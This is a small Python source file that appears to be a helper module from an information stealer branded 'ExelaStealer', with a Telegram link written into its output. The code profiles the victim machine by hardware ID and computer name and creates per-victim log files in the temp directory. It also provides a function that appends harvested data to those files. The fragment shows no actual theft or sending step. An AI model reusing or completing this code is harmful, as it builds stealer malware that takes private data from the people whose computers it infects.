import genHwid, os

def main(entry):
    variable = entry[::-1]
    serialNumber = genHwid.Gen().get_hwid_number() 
    name = os.environ["computername"]
    fileee = open(os.getenv("temp") + f"\\{serialNumber}__{name}\\{variable}\\{variable}.txt", "a", encoding="utf-8", errors="ignore")
    fileee.write("---------https://t.me/ExelaStealer---------\n"+ "==================================================\n")
    fileee.close()

def Write(path, exela):
   filee = open(path, "a", encoding="utf-8", errors="ignore")
   filee.write(exela + "\n")
   filee.close()

